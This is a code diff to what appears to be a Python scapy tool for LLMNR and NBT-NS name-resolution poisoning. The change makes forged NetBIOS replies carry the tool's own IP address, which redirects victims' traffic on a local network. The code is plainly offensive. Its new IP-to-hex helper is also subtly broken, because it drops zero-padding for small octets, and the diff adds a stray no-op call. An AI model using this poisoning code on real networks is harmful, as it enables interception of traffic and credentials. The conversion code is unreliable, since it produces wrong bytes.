@@ -3,6 +3,7 @@
 
 
 from typing import List, Tuple, Type
+import binascii
 from scapy.all import (
     DNSRR,
     DNS,
@@ -292,7 +293,6 @@ class LLMNR(PoisonNetworkInfo):
         Returns:
             DNSRR: [ DNS record ]
         """
-        print(pkt[LLMNRQuery].qd.qname)
         return DNSRR(
             rrname=pkt[LLMNRQuery].qd.qname,
             type="A",
@@ -465,6 +465,12 @@ class NBT_NS(PoisonNetworkInfo):
         """
         response /= UDP(sport=137, dport=137)
         return response
+    def __ip_to_hex(self)->bytes:
+        ip_splited = self.ip.split(".")
+        ip_hex = ""
+        for number in ip_splited:
+            ip_hex = ip_hex + hex(int(number))[2:]
+        return bytearray.fromhex(ip_hex)
 
     def __application_layer(self, pkt: packet, response: packet) -> packet:
         """[ Add application layer to the response packet ]
@@ -492,13 +498,14 @@ class NBT_NS(PoisonNetworkInfo):
         )
         response /= Raw()
         # TTL:165
-        response[Raw].load += bytes("\x00\x00\x00\xa5", encoding="utf8")
+        response[Raw].load += b"\x00\x00\x00\xa5"
         # Data length: 6
-        response[Raw].load += bytes("\x00\x06", encoding="utf8")
+        response[Raw].load += b"\x00\x06"
         # Flags: (B-node,unique)
-        response[Raw].load += bytes("\x00\x00", encoding="utf8")
+        response[Raw].load += b"\x00\x00"
         # ip 0.0.0.0
-        response[Raw].load += bytes("\x00\x00\x00\x00", encoding="utf8")
+
+        response[Raw].load += self.__ip_to_hex()
         return response
 
     def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
@@ -510,6 +517,7 @@ class NBT_NS(PoisonNetworkInfo):
         """
         self.__info_logger.debug("Packet crafted: ")
         self.__info_logger.debug(response.summary())
+        response.summary()
         if ip_of_the_packet not in self.__targets_used:
             self.__info_logger.log(
                 self.__logger_level,
